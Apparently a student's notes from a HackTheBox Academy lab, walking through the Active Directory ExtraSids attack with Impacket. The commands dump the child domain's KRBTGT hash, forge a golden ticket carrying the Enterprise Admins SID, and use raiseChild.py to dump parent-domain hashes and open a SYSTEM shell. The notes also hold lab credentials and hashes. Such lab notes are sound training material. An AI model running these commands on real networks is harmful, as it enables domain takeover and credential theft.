#### ExtraSids Attack

This assumes that a `Child` domain has been compromised. Now we want to compromise the `Parent` domain.

As with the Windows, we need the following information:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain

The KRBTGT hash for the child domain:

```bash
secretsdump.py 'logistics.inlanefreight.local/htb-student_adm:HTB_@cademy_stdnt_admin!@172.16.5.240' -just-dc-user LOGISTICS/krbtgt

9d765b482771505cbe97411065964d5f
```

The SID for the child domain

```bash
lookupsid.py 'logistics.inlanefreight.local/htb-student_adm:HTB_@cademy_stdnt_admin!@172.16.5.240' | grep "Domain SID"
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

The name of a target user in the child domain (does not need to exist!) - `hacker`

The FQDN of the child domain - We know this `logistics.inlanefreight.local`

The SID of the Enterprise Admins group of the root domain

```bash
lookupsid.py 'logistics.inlanefreight.local/htb-student_adm:HTB_@cademy_stdnt_admin!@172.16.5.5' | grep -B12 "Enterprise Admins"
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\administrator (SidTypeUser)
501: INLANEFREIGHT\guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```
#### Gathered information

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist!): `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`
#### Construct the Golden Ticket


kerberos::golden /user:hacker /domain:<Our_current_child_domain> /sid:<sid_of_child_domain> /krbtgt:<krbtgt_NTLM_hash> /sids:<sid_of_enterprise_admins_group> /ptt


```
ticketer.py -nthash <krbtgt_NTLM_hash> -domain <Our_current_child_domain> -domain-sid <sid_of_child_domain> -extra-sid <sid_of_enterprise_admins_group> hacker
```

Example:

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in hacker.ccache
```

Setting the KRB5CCNAME Environment Variable:

```bash
export KRB5CCNAME=hacker.ccache
```

Verify:

```bash
klist
Ticket cache: FILE:hacker.ccache
Default principal: hacker@LOGISTICS.INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
02/06/2025 14:42:19  02/04/2035 14:42:19  krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL@LOGISTICS.INLANEFREIGHT.LOCAL
```

Log into the `Parent` DC:

```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

### raiseChild.py

All of the above can be done with this:

```bash
raiseChild.py -target-exec <parent_dc_ip> '<child_domain>/<domain_admin>:<password>'
```

Example:

```bash
raiseChild.py -target-exec 172.16.5.5 'LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm:HTB_@cademy_stdnt_admin!'
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file vBDTpaXs.exe
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service fYRf on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service fYRf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```